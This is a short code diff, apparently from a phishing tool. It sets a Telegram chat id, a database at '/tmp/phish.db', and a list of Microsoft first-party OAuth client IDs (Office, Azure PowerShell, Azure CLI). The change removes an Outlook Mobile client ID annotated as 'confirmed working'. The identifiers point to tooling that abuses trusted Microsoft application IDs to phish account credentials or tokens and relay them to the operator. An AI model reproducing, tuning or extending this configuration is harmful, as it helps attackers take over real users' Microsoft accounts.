@@ -14,7 +14,6 @@ TELEGRAM_CHAT = "8877118461"
 DB_PATH = "/tmp/phish.db"
 
 CLIENT_IDS = [
-    "27922004-5251-4030-b22d-91ecd9a37ea4",  # Outlook Mobile (confirmed working)
     "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
     "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
     "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
